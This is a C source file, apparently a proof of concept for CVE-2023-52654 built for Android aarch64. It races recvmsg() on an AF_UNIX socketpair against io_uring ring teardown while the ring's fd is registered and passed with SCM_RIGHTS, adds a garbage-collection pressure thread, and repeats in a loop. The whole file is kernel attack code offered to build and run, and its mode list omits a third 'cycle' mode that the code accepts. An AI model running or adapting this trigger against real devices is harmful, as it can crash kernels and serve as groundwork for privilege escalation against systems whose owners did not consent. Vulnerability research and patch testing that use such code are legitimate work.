/*
 * CVE-2023-52654 PoC v2: io_uring fd passed over AF_UNIX while a ring file is
 * registered, racing recvmsg() against ring teardown.  Two modes:
 *   sock (default): register one end of the socketpair in the ring
 *   self          : register the ring's own fd (self cycle)
 *
 * Build: clang --target=aarch64-linux-android21 -fPIE -pie -O2 -pthread uring_cve.c -o uring_cve
 * Usage: ./uring_cve [iters] [mode]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <unistd.h>

#define IORING_REGISTER_FILES 1

static atomic_int g_stop;

static int uring_setup(unsigned entries) {
    unsigned char params[256];
    memset(params, 0, sizeof params);
    return (int)syscall(425, entries, params);
}

static int uring_register(int ring, unsigned opcode, void *arg, unsigned nr) {
    return (int)syscall(427, ring, opcode, arg, nr);
}

static int send_fd(int sock, int fd) {
    char c = 'x';
    struct iovec iov = {&c, 1};
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(cbuf, 0, sizeof cbuf);
    struct msghdr msg;
    memset(&msg, 0, sizeof msg);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_SOCKET;
    cm->cmsg_type = SCM_RIGHTS;
    cm->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cm), &fd, sizeof(int));
    return (int)sendmsg(sock, &msg, MSG_NOSIGNAL);
}

static int recv_fd(int sock, int *out) {
    char c;
    struct iovec iov = {&c, 1};
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(cbuf, 0, sizeof cbuf);
    struct msghdr msg;
    memset(&msg, 0, sizeof msg);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    ssize_t n = recvmsg(sock, &msg, 0);
    if (n <= 0) return -1;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    if (!cm || cm->cmsg_type != SCM_RIGHTS) return -1;
    memcpy(out, CMSG_DATA(cm), sizeof(int));
    return 0;
}

struct pair {
    int sv[2];
    int ring;
};

static void *reader_thread(void *arg) {
    struct pair *p = arg;
    int got = -1;
    if (recv_fd(p->sv[1], &got) == 0 && got >= 0) close(got);
    return NULL;
}

static void *closer_thread(void *arg) {
    struct pair *p = arg;
    close(p->ring);
    return NULL;
}

static void *gc_pressure(void *arg) {
    (void)arg;
    while (!atomic_load(&g_stop)) {
        int a[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, a) != 0) continue;
        int r = uring_setup(4);
        if (r >= 0) {
            int reg[1] = {a[0]};
            uring_register(r, IORING_REGISTER_FILES, reg, 1);
            send_fd(a[0], r);
            close(a[0]);
            close(a[1]);
            close(r);
        } else {
            close(a[0]);
            close(a[1]);
        }
    }
    return NULL;
}

static void spawn(pthread_t *t, void *(*fn)(void *), void *arg) {
    int e = pthread_create(t, NULL, fn, arg);
    if (e != 0) {
        fn(arg); /* run inline if the thread could not be created */
        *t = 0;
    }
}

int main(int argc, char **argv) {
    int iters = argc > 1 ? atoi(argv[1]) : 100;
    const char *mode = argc > 2 ? argv[2] : "sock";
    int self_mode = strcmp(mode, "self") == 0;
    int cycle_mode = strcmp(mode, "cycle") == 0;
    printf("uring_cve v2: iters=%d mode=%s pid=%d\n", iters, mode, (int)getpid());
    fflush(stdout);

    pthread_t gp;
    spawn(&gp, gc_pressure, NULL);

    for (int i = 0; i < iters; i++) {
        struct pair p;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, p.sv) != 0) continue;
        p.ring = uring_setup(8);
        if (p.ring < 0) { close(p.sv[0]); close(p.sv[1]); continue; }

        int reg[1];
        reg[0] = self_mode ? p.ring : (cycle_mode ? p.sv[1] : p.sv[0]);
        uring_register(p.ring, IORING_REGISTER_FILES, reg, 1);
        send_fd(p.sv[0], p.ring);

        pthread_t t1, t2;
        spawn(&t1, reader_thread, &p);
        spawn(&t2, closer_thread, &p);
        if (t1) pthread_join(t1, NULL);
        if (t2) pthread_join(t2, NULL);
        close(p.sv[0]);
        close(p.sv[1]);
        if ((i + 1) % 50 == 0) { printf("  iter %d\n", i + 1); fflush(stdout); }
    }
    atomic_store(&g_stop, 1);
    pthread_join(gp, NULL);
    printf("done\n");
    return 0;
}
